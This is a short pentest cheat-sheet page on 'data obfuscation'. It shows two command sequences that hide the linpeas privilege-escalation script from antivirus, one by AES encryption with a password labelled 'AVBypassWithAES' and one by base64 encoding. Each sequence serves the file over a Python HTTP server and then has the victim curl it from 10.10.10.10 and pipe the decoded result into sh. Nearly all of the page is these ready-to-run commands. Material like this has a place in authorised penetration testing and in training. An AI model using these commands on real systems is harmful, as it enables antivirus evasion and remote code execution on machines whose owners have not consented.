# Data Obfuscation

Data obfuscation is a method to make in sort that the data isn't comprehensible. There can be various reasons to do so, as well as various methods to do so. But generally speaking, it is because you don't want that others are able to "understand" what's going on, or what has happened.

## open-ssl encryption

```commandline
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim
```

## Base64 encoded

```commandline
base64 -w0 linpeas.sh > lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
```
